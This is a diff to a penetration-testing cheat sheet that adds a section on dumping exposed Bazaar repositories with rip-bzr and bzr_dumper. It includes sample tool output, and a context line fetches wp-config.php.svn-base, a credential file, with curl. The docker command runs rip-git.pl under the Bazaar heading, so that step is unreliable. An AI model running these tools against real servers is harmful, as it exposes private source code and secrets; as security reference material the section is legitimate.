@@ -11,6 +11,9 @@
 - [SVN - Source code management](#svn---source-code-management)
   - [SVN example (Wordpress)](#svn-example-wordpress)
   - [Automatic way : svn-extractor](#automatic-way--svn-extractor)
+- [BAZAAR - Source code management](#bazaar---source-code-management)
+  - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
+  - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
 
 ## GIT - Source code management
 
@@ -187,6 +190,40 @@ curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 ```powershell
 git clone https://github.com/anantshri/svn-extractor.git
 python svn-extractor.py –url "url with .svn available"
+```
+
+## BAZAAR - Source code management
+
+### Automatic way : rip-bzr.pl
+
+```powershell
+wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u  
+```
+
+### Automatic way : bzr_dumper
+
+```powershell
+git clone https://github.com/SeahunOh/bzr_dumper
+python3 dumper.py -u "http://127.0.0.1:5000/" -o source
+Created a standalone tree (format: 2a)                                                                                                                                                       
+[!] Target : http://127.0.0.1:5000/
+[+] Start.
+[+] GET repository/pack-names
+[+] GET README
+[+] GET checkout/dirstate
+[+] GET checkout/views
+[+] GET branch/branch.conf
+[+] GET branch/format
+[+] GET branch/last-revision
+[+] GET branch/tag
+[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
+[*] Finish
+
+$ bzr revert
+ N  application.py
+ N  database.py
+ N  static/   
 ```
 
 ## References
